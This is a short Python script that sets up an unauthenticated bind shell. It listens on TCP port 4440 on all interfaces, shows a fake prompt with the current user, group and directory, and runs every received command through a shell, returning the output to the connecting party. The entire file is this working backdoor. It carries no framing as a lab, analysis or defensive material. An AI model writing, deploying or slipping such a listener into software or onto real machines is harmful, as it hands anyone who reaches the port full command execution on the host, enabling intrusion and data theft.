import socket, subprocess
soc = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

soc.bind(('', 4440))
soc.listen()
username = subprocess.check_output("whoami").decode().strip()
group_rights = subprocess.check_output("groups").decode().strip().split()[0]
directory = subprocess.check_output("pwd").decode().strip()

c,a = soc.accept()
command = ""
try:
    while command != "exit\n":
        # directory = subprocess.check_output("pwd").decode().strip()
        c.send(f"{username}@{group_rights} [{directory}]:~$ ".encode())
        command = c.recv(1024).decode()
        proc = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
        output = proc.stdout.read() + proc.stderr.read()
        c.send(output)
    c.send(b"connection closed\n")
    soc.close()
except Exception as e:
    print(e)
    soc.close()
    print("connection closed")